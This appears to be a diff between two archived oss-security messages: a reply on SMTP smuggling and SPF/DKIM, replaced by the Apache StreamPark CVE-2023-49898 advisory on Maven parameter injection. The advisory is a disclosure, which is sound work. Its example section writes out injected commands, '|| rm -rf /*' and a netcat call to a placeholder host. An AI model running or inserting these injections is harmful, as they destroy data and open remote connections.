@@ -1,38 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/22/12
-Message-ID: <72b7513c-c471-1c8f-cbdb-574536d18ec4@gathman.org>
-Date: Fri, 22 Dec 2023 13:42:49 -0500 (EST)
-From: Stuart D Gathman <stuart@...hman.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/15/5
+Message-ID: <194cea17-709a-a972-99b4-c68032c696d3@apache.org>
+Date: Fri, 15 Dec 2023 11:00:59 +0000
+From: Huajie Wang <benjobs@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: New SMTP smuggling attack
+Subject: CVE-2023-49898: Apache StreamPark (incubating): Authenticated system users could trigger remote command execution 
 Content-Type: text/plain; charset=utf-8
 
-On Sat, 23 Dec 2023, Alexander E. Patrakov wrote:
+Severity: low
 
->> I'm trying to make sense of it - where's the compromise of the
->> Confidentiality, Integrity or Availability of the affected mail
->> servers?
->>
->
-> The integrity of the sender's identity, as a minimum, is compromised
-> here. Normally, when relaying mail, servers add a "Received:" header
-> that specifies where they received the connection from. This allows
-> tracking down the true origin of the message. The smuggled message
-> does not have such a header and thus misrepresents the vulnerable
-> relay as the ultimate sender. Additionally, if the relay has
-> destination-based deny lists that deny some but not all addresses on
-> the destination domain, they are sidestepped.
+Affected versions:
 
-This is certainly a bug, but the currently reality is that
-authentication involves SPF, DKIM, and other schemes - and does not
-solely rely on headers.  So can this "delete some headers" attack
-compromise these authentication schemes?
+- Apache StreamPark (incubating) 2.0.0 before 2.1.2
 
-I don't have a PoC, but I think so.  If the original sender can indeed
-convince the victim to relay their message, the victim will sign it
-using their DKIM key - missing header fields and all.  Relays will
-typically alter the MAIL FROM so that SPF authentication passes.
+Description:
 
-But, that first "If" is the kicker.  Any mail admin these days is very
-careful about who can relay through their server.  If they are relaying
-at all, it is for a customer, partner, or buddy.
+In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.
+
+Mitigation:
+
+all users should upgrade to 2.1.2
+
+Example:
+
+##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use "||" or "&&":
+
+/usr/share/java/maven-3/conf/settings.xml || rm -rf /*
+
+/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &
+
+References:
+
+https://streampark.incubator.apache.org
+https://www.cve.org/CVERecord?id=CVE-2023-49898
+
